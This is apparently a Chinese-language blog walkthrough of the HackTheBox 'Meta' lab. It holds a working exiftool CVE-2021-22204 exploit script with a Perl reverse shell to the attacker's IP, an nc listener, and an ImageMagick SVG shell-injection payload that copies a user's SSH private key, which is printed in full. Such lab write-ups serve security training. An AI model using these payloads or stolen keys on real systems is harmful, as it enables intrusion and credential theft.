@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Meta - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Meta靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-19 21:46 EST">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meta - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Meta靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-19 21:46 EST">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/3c4a18f1-9183-44ce-a29e-4c4f4c25a371.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/32030297-7f11-4cff-9252-ef4e42fb962e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/a47ef151-9c4c-4802-a117-2d6c6a919240.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/bd696eb1-b9e8-4361-a8f1-7fab5b43ce99.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/7c68501a-fcb2-4b69-87d0-3a8c3cee3e04.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/aaa7a0ae-161d-4559-bca9-363e7148e9d4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/4fd9c1c1-0e61-420c-9149-7e0f27b1019d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/5b3a584c-11fe-44b9-a6c1-f8d706684b30.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/bc0134a4-f6b6-40b2-a08c-0c17677d05f2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/c9bec073-a3ec-4f05-9003-035441d87cd7.png">
+<meta property="article:published_time" content="2022-02-22T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:46:40.809Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/3c4a18f1-9183-44ce-a29e-4c4f4c25a371.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Meta - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Meta - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-02-22T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-02-22
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Meta"><span class="post-toc-text">Hackthebox - Meta</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Uploads"><span class="post-toc-text">Uploads</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#User"><span class="post-toc-text">User</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Medium/Hackthebox-Meta"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Meta - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-02-22 19:38:36" datetime="2022-02-22T11:38:36.000Z"  itemprop="datePublished">2022-02-22</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Meta"><a href="#Hackthebox-Meta" class="headerlink" title="Hackthebox - Meta"></a>Hackthebox - Meta</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/3c4a18f1-9183-44ce-a29e-4c4f4c25a371.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/32030297-7f11-4cff-9252-ef4e42fb962e.png" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>首先使用nmap进行端口扫描</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 21:46 EST
+Nmap scan report for 10.10.11.140
+Host is up (0.22s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
+|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
+|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-server-header: Apache
+|_http-title: Did not follow redirect to http://artcorp.htb
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=40520%PV=Y%DS=2%DC=T%G=Y%TM=6211ABB
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
+OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   222.35 ms 10.10.14.1
+2   222.43 ms 10.10.11.140
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 45.02 seconds
+</code></pre>
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>进入80端口会自动跳转到artcorp.htb，先加入到hosts</p>
+<pre><code class="bash">echo 10.10.11.140 artcorp.htb &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/a47ef151-9c4c-4802-a117-2d6c6a919240.png" class>
+
+<p>看样子是一家艺术公司，进来后没有什么有用的东西，先fuzz一下目录看看吧</p>
+<h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://artcorp.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt 
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://artcorp.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+assets                  [Status: 301, Size: 234, Words: 14, Lines: 8]
+css                     [Status: 301, Size: 231, Words: 14, Lines: 8]
+server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
+                        [Status: 200, Size: 4427, Words: 1663, Lines: 87]
+:: Progress: [20116/20116] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:54] :: Errors: 0 ::
+</code></pre>
+<p>也没什么有用的东西，去fuzz一下子域名看看</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.artcorp.htb&quot;  -mc 200
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://artcorp.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.artcorp.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10]
+:: Progress: [4989/4989] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
+</code></pre>
+<p>有一个dev01，加入到hosts</p>
+<pre><code class="bash">echo 10.10.11.140 dev01.artcorp.htb &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/bd696eb1-b9e8-4361-a8f1-7fab5b43ce99.png" class>
+
+<h3 id="Uploads"><a href="#Uploads" class="headerlink" title="Uploads"></a>Uploads</h3><p>看不太懂有什么用，先点点看看吧</p>
+<img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/7c68501a-fcb2-4b69-87d0-3a8c3cee3e04.png" class>
+
+<p>这边是一个上传点，上传一个shell试试</p>
+<img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/aaa7a0ae-161d-4559-bca9-363e7148e9d4.png" class>
+
+<p>提示只能上传jpg和png格式的文件，那就随便拿张图试试吧</p>
+<img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/4fd9c1c1-0e61-420c-9149-7e0f27b1019d.png" class>
+
+<p>这里列出了图片的属性信息，我猜测应该是图片隐写或者exiftool的cve漏洞之类的</p>
+<p>本地使用exiftool进行确认一下</p>
+<img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/5b3a584c-11fe-44b9-a6c1-f8d706684b30.png" class>
+
+<p>可以对上，是exiftool无疑了，去搜索一下exiftool的漏洞</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/bc0134a4-f6b6-40b2-a08c-0c17677d05f2.png" class>
+
+<p>发现一个可用的漏洞</p>
+<blockquote>
+<p><a href="https://github.com/convisolabs/CVE-2021-22204-exiftool" target="_blank" rel="noopener">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></p>
+</blockquote>
+<p>下载下来后将IP和端口修改为自己的</p>
+<pre><code class="bash">#!/bin/env python3
+
+import base64
+import subprocess
+
+ip = &#39;10.10.14.16&#39;
+port = &#39;4444&#39;
+
+payload = b&quot;(metadata \&quot;\c${use MIME::Base64;eval(decode_base64(&#39;&quot;
+
+payload = payload + base64.b64encode( f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));if(connect(S,sockaddr_in({port},inet_aton(&#39;{ip}&#39;)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};&quot;.encode() )
+
+payload = payload + b&quot;&#39;))};\&quot;)&quot;
+
+payload_file = open(&#39;payload&#39;, &#39;w&#39;)
+payload_file.write(payload.decode(&#39;utf-8&#39;))
+payload_file.close()
+
+subprocess.run([&#39;bzz&#39;, &#39;payload&#39;, &#39;payload.bzz&#39;])
+subprocess.run([&#39;djvumake&#39;, &#39;exploit.djvu&#39;, &quot;INFO=1,1&quot;, &#39;BGjp=/dev/null&#39;, &#39;ANTz=payload.bzz&#39;])
+subprocess.run([&#39;exiftool&#39;, &#39;-config&#39;, &#39;configfile&#39;, &#39;-HasselbladExif&lt;=exploit.djvu&#39;, &#39;image.jpg&#39;])
+</code></pre>
+<p>然后执行</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/CVE-2021-22204-exiftool]
+└─# python3 exploit.py                          
+    1 image files updated
+
+┌──(root💀kali)-[~/Desktop/CVE-2021-22204-exiftool]
+└─# ls    
+configfile  exploit.djvu  exploit.py  image.jpg  image.jpg_original  lab  payload  payload.bzz  README.md
+</code></pre>
+<p>生成出来的image.jpg就是我们的shell了，拿去上传到web里</p>
+<p>然后本地运行一个nc监听端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<img src="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/c9bec073-a3ec-4f05-9003-035441d87cd7.png" class>
+
+<p>选择后执行即可</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444                                       
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39314
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
+bash-5.0$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>成功拿到一个shell</p>
+<pre><code class="bash">Ctrl+Z返回
+stty raw -echo; fg
+export TERM=xterm
+stty rows 51 cols 237
+</code></pre>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>在&#x2F;home&#x2F;thomas中看到有.ssh文件夹</p>
+<p>进入.ssh文件夹拿key，但是发现没权限</p>
+<pre><code class="bash">bash-5.0$ find /usr/ -type f -newermt &#39;2022-01-01&#39; -ls
+   152500      4 -rwxr-xr-x   1 root     root          126 Jan  3 10:13 /usr/local/bin/convert_images.sh
+</code></pre>
+<p>查找一下从2022-01-01开始创建的新文件，找到了一个sh脚本</p>
+<p>或是运行pspy64也可以发现这个脚本</p>
+<p>我们查看一下</p>
+<pre><code class="bash">#!/bin/bash
+cd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null
+pkill mogrify
+</code></pre>
+<p>这里mogrify只是一个简单的脚本，使用ImageMgick的mogrify将发现的文件转换为png</p>
+<pre><code class="bash">bash-5.0$ /usr/local/bin/mogrify -version
+Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
+Copyright: © 1999-2020 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
+</code></pre>
+<blockquote>
+<p><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" target="_blank" rel="noopener">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></p>
+</blockquote>
+<p>有一个相关漏洞</p>
+<p>生成一个poc.svg</p>
+<pre><code class="bash">&lt;image authenticate=&#39;ff&quot; `echo $(id)&gt; /dev/shm/0wned`;&quot;&#39;&gt;
+  &lt;read filename=&quot;pdf:/etc/passwd&quot;/&gt;
+  &lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&gt;
+  &lt;resize geometry=&quot;400x400&quot; /&gt;
+  &lt;write filename=&quot;test.png&quot; /&gt;
+  &lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;       
+  &lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&gt;
+  &lt;/svg&gt;
+&lt;/image&gt;
+</code></pre>
+<p>测试一下是否可以以thomas的身份执行命令</p>
+<pre><code class="bash">cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
+
+bash-5.0$ ls -la
+total 12
+drwxrwxrwt  2 root     root      100 Feb 21 23:53 .
+drwxr-xr-x 16 root     root     3080 Feb 21 10:51 ..
+-rw-r--r--  1 thomas   thomas     54 Feb 21 23:53 0wned
+-rw-r--r--  1 www-data www-data  406 Feb 21 23:52 poc.svg
+bash-5.0$ cat 0wned 
+uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
+</code></pre>
+<p>确认可以以thomas的身份执行命令，咱们修改一下poc的第一句，用thomas的权限把ssh的key给拿出来</p>
+<pre><code class="bash">&lt;image authenticate=&#39;ff&quot; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;&#39;&gt;
+</code></pre>
+<p>然后再执行一次</p>
+<pre><code class="bash">bash-5.0$ ls -la
+total 16
+drwxrwxrwt  2 root     root      120 Feb 21 23:58 .
+drwxr-xr-x 16 root     root     3080 Feb 21 10:51 ..
+-rw-r--r--  1 thomas   thomas     54 Feb 21 23:53 0wned
+-rw-r--r--  1 thomas   thomas   2590 Feb 21 23:58 id_rsa
+-rw-r--r--  1 www-data www-data  422 Feb 21 23:56 poc.svg
+</code></pre>
+<p>已经储存过来了，查看一下</p>
+<pre><code class="bash">
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>成功拿到thomas的key，现在保存到本地id_rsa后给他600的权限</p>
+<pre><code class="bash">chmod 600 id_rsa
+</code></pre>
+<p>然后使用ssh进行连接</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh thomas@artcorp.htb -i id_rsa 
+Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
